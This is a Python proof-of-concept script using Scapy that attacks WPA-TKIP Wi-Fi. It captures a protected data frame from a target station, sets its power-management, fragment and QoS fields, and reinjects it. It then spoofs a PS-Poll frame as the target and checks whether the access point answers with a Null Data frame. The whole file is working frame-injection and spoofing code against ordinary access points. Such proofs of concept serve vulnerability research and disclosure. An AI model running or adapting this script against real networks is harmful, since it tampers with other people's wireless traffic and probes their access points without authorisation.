#!/usr/bin/python
from scapy.layers.all import RadioTap,Dot11,Dot11QoS
from scapy.config import conf
from scapy.data import ETH_P_ALL
from scapy.sendrecv import sniff

# Defaults.
IFACE		= "wlan2"		# Attacker Interface in Monitor Mode.
BROADCAST	= "ff:ff:ff:ff:ff:ff"	# MAC Address for Broadcasting.
BSSID		= "02:00:00:00:00:00"	# MAC Address of the Access Point.
TARGET		= "02:00:00:00:01:00"	# MAC Address of the Target.

##########################################################################################
def isNullData( packet ):
	# Has to contain Dot11.
	if not Dot11 in packet: return False
	# Has to be Type 2=Data, and Subtype 4=Null or 12=QoS Null.
	if packet[Dot11].type != 2: return False
	if packet[Dot11].subtype != 4 and packet[Dot11].subtype != 12: return False
	# Has to be from AP to Target.
	if packet[Dot11].FCfield & 0x02 != 0x02: return False # The from-DS bit.
	if packet[Dot11].addr1 != TARGET: return False
	if packet[Dot11].addr2 != BSSID: return False
	if packet[Dot11].addr3 != BSSID: return False
	return True

##########################################################################################
def isTKIP( packet ):
	# Has to contain Dot11.
	if not Dot11 in packet: return False
	# Has to be Type 2=Data.
	if packet[Dot11].type != 2: return False
	# Has to be from Target to AP.
	if packet[Dot11].FCfield & 0x01 != 0x01: return False # The to-DS bit.
	if packet[Dot11].addr1 != BSSID: return False
	if packet[Dot11].addr2 != TARGET: return False
	# Has to have Protected bit.
	if packet[Dot11].FCfield & 0x40 != 0x40: return False
	return True

##########################################################################################
def modifyTKIP( packet ):
	assert( packet.haslayer(Dot11) and packet.haslayer(Dot11QoS) )
	# Set the Power Management bit.
	packet[Dot11].FCfield |= 0x10
	# Set the fragment number to one.
	packet[Dot11].SC |= 0x01
	# Set the Quality of Service (QoS) bit.
	packet[Dot11QoS].TID = 1 # Traffic Identifier (TID).
	return packet

##########################################################################################
def getPSPoll():
	# Power Save Poll (PS-Poll).
	return Dot11( type="Control" , subtype=10 , addr1=BSSID , addr2=TARGET )

##########################################################################################
def poc():

	# Capture a TKIP Frame.
	print "[+] Capturing a TKIP Frame..."
	sock = conf.L2socket( type=ETH_P_ALL , iface=IFACE )
	l = sniff( lfilter=isTKIP , count=1 , timeout=120 , opened_socket=sock )
	if len(l) <= 0:
		print "[-] Failed to capture a TKIP Frame."
		exit()
	packet = l[0].getlayer(Dot11)
	print "[+]", packet.summary()
	
	# Inject a Message with enabled Power Management, followed by a PS-Poll Message.
	packet = modifyTKIP( packet )
	sock.send( RadioTap()/packet )
	sock.send( RadioTap()/getPSPoll() )

	# Attempt to capture a Null-Data Message.
	l = sniff( lfilter=isNullData , count=1 , timeout=1 , opened_socket=sock )
	if len(l) > 0:
		print "[+] Received a Null Data Frame."
	else:
		print "[-] Did not Receive a Null Data Frame."

##########################################################################################
if __name__ == "__main__":
	print "[+] Sniffing for Target {} and BSSID {}".format( TARGET , BSSID ),
	print "on Interface {}.".format( IFACE )
	poc()
